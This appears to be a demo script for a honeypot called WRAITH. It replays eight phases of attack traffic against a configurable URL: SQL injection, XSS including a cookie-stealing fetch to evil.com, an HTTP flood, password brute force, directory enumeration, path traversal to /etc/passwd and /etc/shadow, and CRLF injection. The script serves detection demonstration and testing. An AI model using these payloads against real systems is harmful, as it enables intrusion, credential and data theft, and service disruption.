"""
demo/simulate_attack.py — WRAITH Exhibition Demo Script

Sends a scripted sequence of HTTP requests to the running honeypot
demonstrating every attack type in the correct order for the exhibition.

Usage:
    # Default (local server)
    python3 demo/simulate_attack.py

    # Custom URL (ngrok or Docker)
    python3 demo/simulate_attack.py --url https://abc.ngrok.io

    # Single phase only
    python3 demo/simulate_attack.py --phase flood

Exhibition sequence:
    Phase 1 — Normal baseline (establishes green state)
    Phase 2 — SQL Injection (ML + fallback layer)
    Phase 3 — XSS (ML layer)
    Phase 4 — HTTP Flood (rule layer — 30 req burst)
    Phase 5 — Web Brute Force (rule layer — 5 login attempts)
    Phase 6 — Dir Enumeration (rule layer — 10 unique paths)
    Phase 7 — File Disclosure (ML + fallback layer)
    Phase 8 — CRLF Injection (fallback layer)
"""

import requests
import time
import sys
import argparse
from datetime import datetime

BASE_URL = "http://127.0.0.1:5000"
DELAY_SHORT = 0.3
DELAY_LONG = 2.5

def send(method: str, path: str, payload: dict = None,
         headers: dict = None, label: str = "") -> None:
    """Send a single HTTP request and print a timestamped result line."""
    url = BASE_URL + path
    default_headers = {
        "User-Agent": "Mozilla/5.0 (WRAITH-DEMO/1.0)",
        "Accept": "application/json",
    }
    if headers:
        default_headers.update(headers)

    try:
        if method.upper() == "POST":
            resp = requests.post(url, json=payload,
                                 headers=default_headers, timeout=5)
        else:
            resp = requests.get(url, headers=default_headers, timeout=5)

        ts = datetime.now().strftime("%H:%M:%S")
        status = "✓" if resp.status_code < 500 else "x"
        print(f"  [{ts}] {status} {method:<5} {path:<35} → {label}")

    except requests.exceptions.ConnectionError:
        print(f"\n  [FATAL] Cannot connect to {BASE_URL}")
        print(f"          Start the server: python3 main.py")
        sys.exit(1)
    except Exception as e:
        print(f"  [ERROR] {e}")

def phase_normal():
    print("\n" + "=" * 60)
    print("[PHASE 1/8] Normal Baseline Traffic")
    print("  Dashboard should show: NORMAL (blue, score 000)")
    print("=" * 60)
    endpoints = [
        ("GET", "/api/search", None),
        ("GET", "/api/users", None),
        ("GET", "/api/orders", None),
        ("POST", "/api/search", {"q": "laptop"}),
        ("GET", "/api/logs", None),
    ]
    for method, path, payload in endpoints:
        send(method, path, payload, label="Normal traffic")
        time.sleep(DELAY_SHORT)
    time.sleep(DELAY_LONG)

def phase_sqli():
    print("\n" + "=" * 60)
    print("[PHASE 2/8] SQL Injection Attack")
    print("  Expected: SQL Injection | Layer: ML or FALLBACK | Score: 78-95")
    print("=" * 60)
    payloads = [
        {"id": "1 UNION SELECT username,password FROM users --"},
        {"username": "admin'--",                 "password": "x"},
        {"search": "' OR '1'='1"},
        {"id": "1; DROP TABLE users; --"},
        {"filter": "WAITFOR DELAY '0:0:5'--"},
    ]
    for p in payloads:
        send("POST", "/api/users", p, label="SQL Injection")
        send("POST", "/admin/login", p, label="SQL Injection")
        time.sleep(DELAY_SHORT)
    time.sleep(DELAY_LONG)

def phase_xss():
    print("\n" + "=" * 60)
    print("[PHASE 3/8] XSS Attack")
    print("  Expected: XSS | Layer: ML or FALLBACK | Score: 78-95")
    print("=" * 60)
    payloads = [
        {"comment": "<script>alert('XSS')</script>"},
        {"input": "<img src=x onerror=alert(document.cookie)>"},
        {"data": "<svg onload=fetch('http://evil.com/'+document.cookie)>"},
        {"q": "javascript:alert(1)"},
    ]
    for p in payloads:
        send("POST", "/api/search", p, label="XSS")
        send("GET", "/api/users?q=<script>alert(1)</script>", label="XSS probe")
        time.sleep(DELAY_SHORT)
    time.sleep(DELAY_LONG)

def phase_flood():
    print("\n" + "=" * 60)
    print("[PHASE 4/8] HTTP Flood Attack")
    print("  Expected: HTTP Flood | Layer: RULE | Score: 95")
    print("  Sending 30 rapid requests — rule fires at 20 req/s")
    print("=" * 60)
    flood_headers = {"User-Agent": "DDoS-Bot/2.0 (Flood)"}
    # No delay between requests to trigger the flood rule (threshold is 20 req/sec)
    for i in range(30):
        send("GET", "/api/users",
             headers=flood_headers,
             label=f"Flood {i+1}/30")
    
    time.sleep(DELAY_LONG)

def phase_bruteforce():
    print("\n" + "=" * 60)
    print("[PHASE 5/8] Web Brute Force Attack")
    print("  Expected: Web Brute Force | Layer: RULE | Score: 95")
    print("  Sending 5 POST /admin/login — rule fires at 3 attempts in 2 min")
    print("=" * 60)
    credentials = [
        {"username": "admin", "password": "password123"},
        {"username": "admin", "password": "admin"},
        {"username": "root", "password": "toor"},
        {"username": "admin", "password": "letmein"},
        {"username": "superuser", "password": "super123"},
    ]
    for creds in credentials:
        send("POST", "/admin/login", creds, label="Brute Force")
        time.sleep(0.5)
    time.sleep(DELAY_LONG)

def phase_enumeration():
    print("\n" + "=" * 60)
    print("[PHASE 6/8] Directory Enumeration Attack")
    print("  Expected: Directory Enumeration | Layer: RULE | Score: 95")
    print("  Probing 10 unique unknown paths — rule fires at 5 in 60s")
    print("=" * 60)
    paths = [
        "/.env",         "/wp-admin",        "/phpmyadmin",
        "/.git/config",  "/server-status",   "/admin/config",
        "/.htaccess",    "/web.config",       "/backup.zip",
        "/etc/passwd",
    ]
    for path in paths:
        send("GET", path, label="Dir Enumeration")
        time.sleep(DELAY_SHORT)
    time.sleep(DELAY_LONG)

def phase_file_disclosure():
    print("\n" + "=" * 60)
    print("[PHASE 7/8] File Disclosure Attack")
    print("  Expected: File Disclosure | Layer: ML or FALLBACK | Score: 80-92")
    print("=" * 60)
    payloads = [
        {"path": "../../../etc/passwd"},
        {"file": "../../../../etc/shadow"},
        {"doc": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
        {"url": "file:///etc/passwd"},
    ]
    for p in payloads:
        send("POST", "/api/admin/export", p, label="File Disclosure")
        send("GET", "/backup",               label="File Disclosure")
        time.sleep(DELAY_SHORT)
    time.sleep(DELAY_LONG)

def phase_crlf():
    print("\n" + "=" * 60)
    print("[PHASE 8/8] CRLF Injection Attack")
    print("  Expected: CRLF Injection | Layer: FALLBACK | Score: 78")
    print("=" * 60)
    payloads = [
        {"input": "test%0d%0aSet-Cookie:session=hacked"},
        {"header": "value\r\nContent-Type: text/html"},
        {"data": "inject%0ALocation:http://evil.com"},
    ]
    for p in payloads:
        send("POST", "/api/users", p, label="CRLF Injection")
        send("GET", "/api/search",  label="CRLF probe")
        time.sleep(DELAY_SHORT)
    time.sleep(DELAY_LONG)

PHASES = {
    "normal": phase_normal,
    "sqli": phase_sqli,
    "xss": phase_xss,
    "flood": phase_flood,
    "bruteforce": phase_bruteforce,
    "enumeration": phase_enumeration,
    "file": phase_file_disclosure,
    "crlf": phase_crlf,
}

def main():
    parser = argparse.ArgumentParser(
        description="WRAITH Exhibition Demo — Attack Simulation Script"
    )
    parser.add_argument(
        "--url",
        default="http://127.0.0.1:5000",
        help="Base URL of the WRAITH honeypot (default: http://127.0.0.1:5000)"
    )
    parser.add_argument(
        "--phase",
        choices=list(PHASES.keys()) + ["all"],
        default="all",
        help="Run a single attack phase or all phases (default: all)"
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.3,
        help="Delay between requests in seconds (default: 0.3)"
    )
    args = parser.parse_args()

    global BASE_URL, DELAY_SHORT
    BASE_URL = args.url.rstrip("/")
    DELAY_SHORT = args.delay

    print("\n" + "╔" + "=" * 58 + "╗")
    print("║  WRAITH — EXHIBITION DEMO SIMULATION" + " " * 21 + "║")
    print("║  Target: " + BASE_URL.ljust(48) + "║")
    print("╚" + "=" * 58 + "╝")
    print("\n Open the dashboard: " + BASE_URL + "/dashboard/")
    print("  Watch each phase on the live terminal feed.\n")

    try:
        requests.get(BASE_URL + "/api/search", timeout=3)
        print("  [✓] Server reachable. Starting simulation...\n")
    except Exception:
        print(f"  [x] Cannot reach {BASE_URL}")
        print(f"      Start server: python3 main.py")
        sys.exit(1)

    if args.phase == "all":
        for phase_fn in PHASES.values():
            phase_fn()
    else:
        PHASES[args.phase]()

    print("\n" + "=" * 60)
    print("  SIMULATION COMPLETE")
    print("  Check the dashboard forensic panel for full attack reports.")
    print("=" * 60 + "\n")

if __name__ == "__main__":
    main()